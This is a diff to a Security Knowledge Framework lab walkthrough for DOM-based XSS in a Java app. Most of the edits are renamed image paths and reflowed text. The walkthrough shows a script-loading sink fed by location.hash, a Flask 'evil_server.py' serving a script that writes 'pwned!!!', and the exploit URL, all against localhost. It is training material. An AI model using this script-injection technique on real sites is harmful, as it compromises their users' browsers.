@@ -1,10 +1,8 @@
-# KBID 3 - Cross Site Scripting \(DOM-2\)
+# Java - XSS-DOM-2
 
 ## Running the app Java
 
-First make sure java is installed on your host machine.
-After installation, we go to the folder of the lab we want to practice.
-"i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following command:
+First make sure java is installed on your host machine. After installation, we go to the folder of the lab we want to practice. "i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following command:
 
 ```
 $ ./mvnw spring-boot:run
@@ -20,11 +18,11 @@ Now that the app is running let's go hacking!
 
 The application shows no input field or anything else we can interact with. Let's inspect the source code.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/4.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/4.png)
 
 Inspecting the source code of the application.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/5.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/5.png)
 
 ```javascript
 function loadWelcomeMessage() {
@@ -49,7 +47,7 @@ endpoint = location.hash.slice(5);
 
 Declaring endpoint variable which takes the url, whatever is after the hash(#) and using slice to remove the first 4 characters after that. If the endpoint exists it will load the js file from there.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/1.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/1.png)
 
 ## Exploitation
 
@@ -67,13 +65,11 @@ def static_file(path):
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=1337)
-
 ```
 
-Save the snippet above to &gt; evil_server.py and run the commands below to install some dependencies.
-Of course you can also run your app on whatever service you want it does not have to be python flask.
+Save the snippet above to > evil\_server.py and run the commands below to install some dependencies. Of course you can also run your app on whatever service you want it does not have to be python flask.
 
-```text
+```
 $ pip3 install flask
 ```
 
@@ -85,19 +81,19 @@ document.getElementsByClassName("panel-body")[0].innerText = "pwned!!!";
 
 We are ready to start our server:
 
-```text
+```
 $ python3 evil_server.py
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/2.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/2.png)
 
 Now we can serve our malicious js file to the application
 
-```text
+```
 http://localhost:5000/#xxxxhttp://localhost:1337
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/3.png)
+![](../../.gitbook/assets/java/XSS-DOM-2/3.png)
 
 ## Additional sources
 
